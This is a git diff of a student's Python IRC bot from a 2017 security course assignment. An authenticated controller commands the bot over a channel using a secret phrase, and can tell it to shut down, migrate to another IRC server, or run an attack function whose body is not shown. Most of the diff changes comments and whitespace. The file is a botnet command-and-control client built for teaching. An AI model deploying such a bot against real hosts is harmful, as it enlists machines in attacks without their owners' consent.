@@ -1,4 +1,14 @@
+#
 #bot.py
+#
+# This program implements a simple bot that can be controlled by an authenticated
+# controller via an IRC client.
+#
+# Authors: Shane Sims and Mason Lieu
+# Assignment 6
+# CPSC 526 Fall 2017
+# version: 3 December 2017
+#
 import sys
 import random
 import socket
@@ -44,7 +54,7 @@ def connectToIRC():
         time.sleep(5)
 
 
-# Function that monitors IRC message traffic to find messages containing the keyword
+# Function that monitors IRC message traffic to find messages containing keywords
 def listen():
     global controllerNick
     madeContactWithControl = False
@@ -59,7 +69,7 @@ def listen():
                 IRCconnection.close()                                           # Close connection to IRC
                 return                                                          # Attempt to reconnect in main
             else:
-                if((len(splitmessage) > 0) and (splitmessage[0] == "PING")):      # Prevent inactive connection from closing
+                if((len(splitmessage) > 0) and (splitmessage[0] == "PING")):     # Prevent inactive connection from closing
                     IRCconnection.sendall(b'PONG\r\n')
                     print("sent: PONG")
                 elif (SECRET_PHRASE in splitmessage):                           # Detect use of SECRET_PHRASE as message in CHANNEL
@@ -73,7 +83,7 @@ def listen():
                         wordLocation = wordLocation - 1
 
 
-                    firstWord = (splitmessage[wordLocation])[1:]                           # Get first word of messeage - drop ':' char
+                    firstWord = (splitmessage[wordLocation])[1:]                # Get first word of messeage - drop ':' char
                     print("DEBUG: " + firstWord)
                     nickOfSender = (splitmessage[0].split("!")[0])[1:]
                     if((firstWord == "shutdown") and (madeContactWithControl) and (nickOfSender == controllerNick)):
@@ -110,7 +120,7 @@ def joinChannel(chann, connection):
     response = connection.recv(512)
     print(response.decode("utf-8"))
 
-# Function that sends the nick of the bot to the controller via private message #TODO: send attack count or any other info too?
+# Function that sends the nick of the bot to the controller via private message
 def pvtmsgToController(messageToSend):
     pvtMessage = "PRIVMSG " + controllerNick + " :" + messageToSend + "\r\n"
     print("sending: " + pvtMessage)
@@ -151,20 +161,19 @@ def attack(hostName, hostPort):
 def migrate(hostName, hostPort, channel):
     global IRCmoveCon
     global IRCconnection
-    print("nothing")
     try:
         print("\nStarting move to new IRC server...")
-        IRCmoveCon = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # Create socket for TCP connection to IRC channet
-        IRCmoveCon.connect((hostName,hostPort))                                  # Connect to cmd line specified host and port
+        IRCmoveCon = socket.socket(socket.AF_INET, socket.SOCK_STREAM)          # Create socket for TCP connection to IRC channet
+        IRCmoveCon.connect((hostName,hostPort))                                 # Connect to cmd line specified host and port
         print("Moved to IRC server at " + hostName)
         nickSet = False
         while(nickSet == False):
             candidateNick = getNick()
             NICK_Msg = "NICK " + candidateNick +"\r\n"                          # Construct NICK message
             USER_Msg = "USER " + candidateNick + " * * :Not Yourconsern\r\n"    # Construct USER message
-            IRCmoveCon.sendall(NICK_Msg.encode("utf-8"))                     # Send NICK message
+            IRCmoveCon.sendall(NICK_Msg.encode("utf-8"))                        # Send NICK message
             IRCmoveCon.sendall(USER_Msg.encode("utf-8"))
-            NICK_Response = IRCmoveCon.recv(512)                             # Recieve NICK response of 512 characters max for IRC protocol
+            NICK_Response = IRCmoveCon.recv(512)                                # Recieve NICK response of 512 characters max for IRC protocol
             print(NICK_Response.decode("utf-8"))
             NICK_Response = NICK_Response.split()
             if((NICK_Response[1]).decode("utf-8") == "001"):
@@ -176,6 +185,7 @@ def migrate(hostName, hostPort, channel):
         IRCconnection = IRCmoveCon
     except Exception as e:
         print("Error3: " + str(e))
+        pvtmsgToController("move unsuccessful")
 
 # Function to shutdown the bot when instructed by controller.
 def shutdownBot():
